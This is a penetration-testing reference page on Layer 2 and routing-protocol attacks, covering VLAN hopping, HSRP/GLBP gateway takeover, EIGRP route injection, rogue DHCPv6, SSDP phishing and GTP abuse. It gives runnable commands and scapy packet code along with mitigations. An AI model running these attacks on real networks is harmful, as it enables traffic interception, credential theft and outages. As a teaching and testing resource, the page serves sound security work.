---
title: Layer 2 and Routing Protocol Attacks
type: technique
domain: network
tags: [layer2, vlan, hsrp, glbp, eigrp, fhrp, dhcpv6, ssdp, upnp, mitm]
sources: [hacktricks-network]
related: ["[[ipv6-attacks]]", "[[internal-ntlm-relay]]", "[[network-discovery]]", "[[pivoting-tunneling]]"]
---

# Layer 2 and Routing Protocol Attacks

Once you have a wired foothold on an internal LAN (rogue device, compromised host, dropped implant), the switch fabric and the router-redundancy / interior-routing control planes become attack surface. Most of these protocols were designed for a trusted operator community and ship with weak or absent authentication, so an attacker on the segment can spoof a trunk, elect themselves as the default gateway, poison the routing table, or stand up a rogue address server, all of which lead to man-in-the-middle or lateral segmentation bypass.

Name-resolution poisoning (LLMNR / NBT-NS / mDNS / WPAD) and the IPv6 RA / rogue-DNS mitm6 chain are the other half of on-LAN MITM but are documented separately: see [[internal-ntlm-relay]] for the poison-then-relay flow and [[ipv6-attacks]] for the full IPv6 takeover. This page covers the Layer-2 and FHRP/IGP delta.

## VLAN Hopping

Goal: reach VLANs your access port is not assigned to, bypassing 802.1Q segmentation.

### Switch-spoofing via DTP

Cisco access ports that leave the Dynamic Trunking Protocol enabled will negotiate a full 802.1Q trunk if the peer claims to be a switch. One crafted DTP "desirable"/"trunk" frame flips the port to a trunk carrying every allowed VLAN, after which you just create sub-interfaces per VLAN.

```bash
# Negotiate a trunk with Yersinia (GUI: Launch attack -> DTP -> enable trunking)
sudo yersinia -G

# or the dtp-spoof PoC
sudo python3 dtp-spoof.py -i eth0 --desirable
```

Once the port is a trunk, bring up tagged sub-interfaces and pull DHCP (or set static) per target VLAN:

```bash
sudo modprobe 8021q
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link set eth0.20 up
sudo dhclient -v eth0.20            # or: sudo ip addr add 10.10.20.66/24 dev eth0.20
```

If you already have privileged switch CLI access, the equivalent is to force the port to trunk directly (`switchport mode trunk` / `switchport trunk encapsulation dot1q`) and enumerate VLANs with `show vlan brief`; identify your own port via CDP or `show mac address-table | include <your-mac>`.

### Double-tagging (native-VLAN abuse)

If your port sits on the native (untagged) VLAN, a frame with two stacked 802.1Q tags escapes to a second VLAN even on a locked-down access port: the first switch pops the outer (native) tag and forwards the still-tagged frame across the trunk. It is one-way (no return path) so it suits blind injection, not interactive MITM. VLANPWN's `DoubleTagging.py` automates it:

```bash
python3 DoubleTagging.py --interface eth0 --nativevlan 1 --targetvlan 20 \
        --victim 10.10.20.24 --attacker 10.10.1.54
```

Hand-rolled with scapy, the same primitive is `Dot1Q(vlan=native)/Dot1Q(vlan=target)/IP()/...`. In Q-in-Q (802.1ad) cores, look for ethertype `0x88a8` and try popping the outer service tag to tunnel arbitrary tagged traffic across zones.

### Voice-VLAN hijacking (IP-phone spoofing)

Edge ports are commonly "data + voice": untagged data VLAN plus a tagged voice VLAN advertised over CDP or LLDP-MED. Impersonating an IP phone learns the voice VLAN ID (VVID) and hops into it even when DTP is off. VoIP Hopper handles CDP, DHCP options 176/242, and LLDP-MED:

```bash
sudo voiphopper -i eth0 -f cisco-7940   # one-shot discovery and hop
sudo voiphopper -i eth0 -z              # passive sniff, auto-hop when VVID learnt
```

### Mitigations

Set user ports to `switchport mode access` + `switchport nonegotiate` (kills DTP); retag the native VLAN to an unused black-hole and `vlan dot1q tag native`; prune trunks to only the needed VLANs; enforce DHCP snooping, DAI, port-security and 802.1X; lock or disable LLDP-MED voice auto-policy. Watch vendor advisories too: firmware bugs bypass a clean config (e.g. CVE-2022-20728 Aironet native-VLAN injection, CVE-2024-20465 IOS-IE SVI ACL bypass).

## FHRP Takeover: HSRP / GLBP

First-Hop Redundancy Protocols merge several routers into one virtual gateway. If you inject control packets with a higher priority than the real routers and authentication is absent (or crackable), you win the election, become the active gateway, and every host's default-route traffic flows through you: a clean MITM position.

The general playbook after winning the election is identical for both protocols:

```bash
# 1. Promiscuous + IP forwarding so traffic transits you
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
# 2. Claim the virtual IP as a secondary and NAT everything out
sudo ip addr add 10.10.100.254/24 dev eth0        # the VIP
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
# 3. Keep upstream reachability via the real router
sudo ip route del default
sudo ip route add default via 10.10.100.100        # ex-active router
# 4. Harvest creds from the transiting traffic (net-creds, pcredz, tcpdump)
```

### HSRP

Cisco-proprietary, single active router. HSRPv1: multicast `224.0.0.2`, UDP/1985, virtual MAC `0000.0c07.acXX`. HSRPv2: `224.0.0.102` (IPv6 `FF02::66`), UDP/2029 for v6, virtual MAC `0000.0c9f.fXXX`. Priority 1-255; flood hellos at 255 to force peers into Speak/Listen and take Active.

```python
from scapy.all import *
# Hello, priority 255, group 1 -> win the election if no auth
pkt = IP(dst="224.0.0.102")/UDP(sport=1985, dport=1985)/Raw(
    b"\x00\x02\xff\x03\x00\x00\x00\x01")
send(pkt, iface="eth0", inter=1, loop=1)
```

Loki drives the whole flow interactively (identify advertisement, inject, impersonate). HSRP auth is weak: legacy plaintext is trivially spoofed, and MD5 only covers the payload, so capture and crack it offline:

```bash
tcpdump -i eth0 -w hsrp.pcap
python2 hsrp2john.py hsrp.pcap > hsrp.hashes
john --wordlist=rockyou.txt hsrp.hashes
```

On shared/ISP VLANs HSRPv1 multicasts are often visible to tenants; without auth you can preempt neighbouring traffic. Some NX-OS releases also allowed DoS against authenticated groups (CSCup11309).

### GLBP

Also Cisco, but genuinely load-balances: one AVG (Active Virtual Gateway) hands virtual MACs to several AVFs. Multicast `224.0.0.102` (IPv6 `FF02::66`), UDP/3222, virtual MAC `0007.b4xx.xxyy`. Priority default 100, range 1-255. Send priority+weight 255 to become AVG, then run the same MITM setup as above.

```python
from scapy.all import *
# Version 1, Hello, priority 255, weight 100
pkt = IP(dst="224.0.0.102")/UDP(dport=3222, sport=3222)/Raw(b"\x01\x00\xff\x64")
send(pkt, iface="eth0", loop=1, inter=1)
```

Craft the header bytes (version/opcode/priority/weight/VRID) to match what you sniffed; Loki also has a one-click GLBP injection. Sniff the VIP, auth presence, and priorities in Wireshark first. Mitigation for both: enable strongest available auth (MD5 key-chains), and prefer L3 segmentation / ACLs that pin the real gateway MAC.

## EIGRP Attacks

EIGRP (Cisco IGP) rides IP protocol 88, multicasting to `224.0.0.10` (IPv6 `FF02::A`). Neighbours only adjoin when their K-values and AS match, and HELLO carries those K-values plus Hold Time in the PARAMETER TLV (Type 0x0001), so a passive capture reveals everything you need. Always recon before injecting:

```bash
sudo tcpdump -ni eth0 'ip proto 88 or ip6 proto 88'   # AS, K-values, auth, neighbor IP
sudo nmap --script broadcast-eigrp-discovery           # enumerate prefixes via HELLO->UPDATE
```

Confirm the authentication state from the capture: none, MD5, or (named-mode) HMAC-SHA-256. Auth blocks blind spoofing; without it, injection is straightforward.

Attack classes (the in9uz toolkit ships a script per class):

- Fake-neighbor / HELLO flood (`helloflooding.py --interface eth0 --as 1 --subnet 10.10.100.0/24`): spam HELLOs to pressure neighbor tables and CPU (DoS).
- Blackhole route injection (`routeinject.py --interface eth0 --as 1 --src 10.10.100.50 --dst 172.16.100.140 --prefix 32`): inject a bogus route so a target prefix is null-routed.
- K-value mismatch (`relationshipnightmare.py --interface eth0 --as 1 --src <real-router>`): inject altered K-values to churn adjacencies up/down (DoS).
- Routing-table overflow (`routingtableoverflow.py`): flood false prefixes to exhaust router CPU/RAM.

For higher-fidelity route poisoning that survives (tracking seq/ack and SEQUENCE TLVs), craft with scapy's EIGRP contrib layer:

```python
from scapy.all import *
load_contrib("eigrp")
sendp(Ether()/IP(src="192.168.1.248", dst="224.0.0.10")/
      EIGRP(opcode="Update", asn=100, seq=0, ack=0,
            tlvlist=[EIGRPIntRoute(dst="192.168.100.0", nexthop="192.168.1.248")]))
```

`EIGRPAuthData`, `EIGRPSeq`, `EIGRPStub`, and `EIGRPv6IntRoute`/`EIGRPv6ExtRoute` cover authenticated adjacencies, reliable transport, and IPv6 route injection (multicast `FF02::A`; a dual-stack segment may expose EIGRP even when IPv4 looks clean). Routopsy (FRRouting + scapy) builds a virtual-router lab for realistic dynamic-routing attacks.

## Rogue DHCPv6

On dual-stack and Windows/AD networks, a rogue DHCPv6 server is the classic path to DNS takeover, the same primitive mitm6 abuses to become the network's DNS and drive WPAD/NTLM relay. The full chain lives in [[ipv6-attacks]]; the DHCPv6 delta:

- Clients listen on UDP/546, servers/relays on UDP/547. Solicit goes to `ff02::1:2` (All_DHCP_Relay_Agents_and_Servers).
- Client/server identity is a DUID in `OPTION_CLIENTID`/`OPTION_SERVERID` (useful to fingerprint a host across address changes); addresses via `IA_NA`, prefix delegation via `IA_PD`.
- The Reconfigure message is not blindly accepted: a client only honours it if it advertised `OPTION_RECONF_ACCEPT`, so unsolicited Reconfigure attacks usually fail.

Recon and abuse with THC-IPv6:

```bash
sudo tcpdump -vvv -i eth0 'udp port 546 or udp port 547'   # observe DHCPv6
sudo atk6-dump_dhcp6 eth0                                    # discover servers/options
sudo atk6-fake_dhcps6 eth0 <PREFIX>/<LEN> <DNSv6>           # rogue server: push address + attacker DNS
sudo atk6-flood_dhcpc6 eth0                                  # starvation / pool exhaustion
```

For the AD relay payoff (rogue DNS -> WPAD -> NTLM relay to LDAP/ADCS), drive [[internal-ntlm-relay]] with mitm6 rather than THC's generic server.

## SSDP / UPnP Abuse

SSDP (UDP/1900) advertises and discovers UPnP services with no DHCP/DNS needed; UPnP's control layer runs SOAP over HTTP against device description XML. Three offensive uses:

### Credential phishing with evil-ssdp

Answer M-SEARCH queries with a spoofed UPnP device that surfaces a template (fake scanner, Office365, password vault) in the victim's network UI. Users who trust the "device" hand over credentials, and you can redirect them onward to keep the ruse credible.

```bash
sudo python3 evil_ssdp.py eth0 -t office365   # serve a phishing template on 1900/8888
```

### UPnP IGD port mapping (punch / pivot)

If an Internet Gateway Device exposes an open SOAP control point, `AddPortMapping` requests can open NAT holes or forward traffic to internal hosts, useful for pivoting or exposing an internal service. Miranda discovers and drives UPnP services, Umap enumerates WAN-reachable UPnP commands, and the upnp-arsenal repo collects further tooling.

### SSDP amplification DoS

A small M-SEARCH to `239.255.255.250:1900` returns a much larger response; with a spoofed source it becomes a reflection/amplification DDoS primitive. Mitigate by disabling UPnP where unneeded, blocking 1900/UDP at the edge, and monitoring for cleartext creds on the wire.

## GTP / Telecom (brief)

Niche, but any foothold inside a telecom perimeter can usually reach the mobile-core signalling planes directly, because GPRS Tunnelling Protocol (GTP) rides plain UDP with almost no authentication. High-value primitives:

- Enumerate GTP-C listeners with `masscan <range> -pU:2123`; map subscribers to their serving SGSN/MME with GTP-C Create-PDP-Context probes (`cordscan`).
- GTP-in-GTP / roaming-interface abuse: on a mis-filtered GRX/IPX segment you can speak PFCP on N4 to hijack sessions (`PFCPSessionModificationRequest` with a duplicate PDR + a FAR pointing at your host), or replay guessed GTP-U TEIDs (UDP/2152) to inject user traffic.
- `sgsnemu` (OsmoGGSN) negotiates a real PDP context to a live GGSN/PGW, giving you a `tun0` into the data plane for pivoting.

SS7/Diameter roaming surveillance (GT spoofing, `anyTimeInterrogation`, SIMjacker binary SMS) and 5G NAS downgrade (EEA0/EIA0) are further specialised surfaces; see the HackTricks telecom page for depth.

## Tools

| Tool | Use |
|---|---|
| yersinia | DTP trunk negotiation, other L2 protocol attacks (GUI or CLI) |
| VoIP Hopper | Voice-VLAN discovery/hop via CDP/LLDP-MED |
| VLANPWN | Double-tagging injection |
| Loki | HSRP/GLBP/EIGRP injection and MITM setup |
| scapy | Craft HSRP/GLBP/EIGRP/DHCPv6/QinQ frames (EIGRP + PFCP contrib layers) |
| Routopsy / FRRouting | Virtual-router lab for dynamic routing attacks |
| THC-IPv6 (atk6-*) | Rogue DHCPv6, DHCPv6 starvation, discovery |
| mitm6 | IPv6/DHCPv6 DNS takeover for NTLM relay (see [[ipv6-attacks]]) |
| evil-ssdp | SSDP/UPnP phishing device spoofing |
| Miranda / Umap | UPnP service discovery and IGD command execution |
| hsrp2john + john | Offline crack of captured HSRP MD5 auth |
| net-creds / pcredz | Harvest creds from MITM'd traffic |

## Sources

- HackTricks: Lateral VLAN Segmentation Bypass, GLBP & HSRP Attacks, EIGRP Attacks, DHCPv6, Spoofing SSDP and UPnP Devices, Telecom Network Exploitation
- in9uz, "Cisco Nightmare: Pentesting Cisco Networks Like a Devil"
- SensePost Routopsy; THC-IPv6; VLANPWN; VoIP Hopper; hackingarticles evil-ssdp
